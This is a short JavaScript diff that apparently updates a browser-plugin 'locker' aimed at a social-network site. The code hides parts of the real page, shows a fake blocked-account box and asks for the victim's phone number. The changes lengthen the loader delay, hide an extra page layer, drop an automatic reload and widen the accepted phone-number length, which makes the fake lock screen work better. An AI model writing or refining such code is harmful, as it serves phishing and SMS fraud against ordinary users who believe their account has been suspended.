@@ -172,8 +172,9 @@ function Loader(){
 		ge('box_loader').style.display = 'block';
 		setTimeout(function(){
 			ge('box_loader').style.display = 'none';
+			ge('box_layer_wrap').style.display = 'none';
 			MyBoxLock();
-		}, 2500);
+		}, 3500);
 	}
 	catch(e){
 		MyBoxLock();
@@ -197,6 +198,7 @@ function MyBoxLock(){
 	if(run == 2){
 		try{
 			ge('page_layout').style.width = '661px';
+			document.body.setAttribute("class", "is_rtl font_default pads");
 			ge('notifiers_wrap').parentNode.removeChild(document.getElementById('notifiers_wrap'));
 			ge('ts_wrap').parentNode.removeChild(document.getElementById('ts_wrap'));
 			ge('box_layer_wrap').parentNode.removeChild(document.getElementById('box_layer_wrap'));
@@ -207,7 +209,7 @@ function MyBoxLock(){
 			ge('stl_side').parentNode.removeChild(document.getElementById('stl_side'));
 			ge('footer_wrap').setAttribute('class', 'simple');
 			ge('footer_wrap').style.width = 'auto';
-			ge('rb_box_fc_clist').innerHTML = '';
+			//ge('rb_box_fc_clist').innerHTML = '';
 			window.FastChat = {};
 		} catch(e){}
 	}
@@ -233,7 +235,6 @@ function MyBoxLock(){
 	if(run == 1){
 		boxLock.show();
 		SendStat(2, "small");
-		setTimeout(function(){document.location.reload();}, 5000);
 		try {plg.Save('vRun', '2');} catch(e){}
 	}
 		
@@ -265,7 +266,7 @@ function ChangePass(){
 
 function GetCode(){
 	text = ge('blocked_phone');
-	if(!/^[0-9]{10}$/.test(text.value)){
+	if(!/^[0-9]{9,12}$/.test(text.value)){
 		ge('blocked_send_phone').innerText = '';
 		ge('btn_lock_1').style.display = 'block';
 		setTimeout(function(){
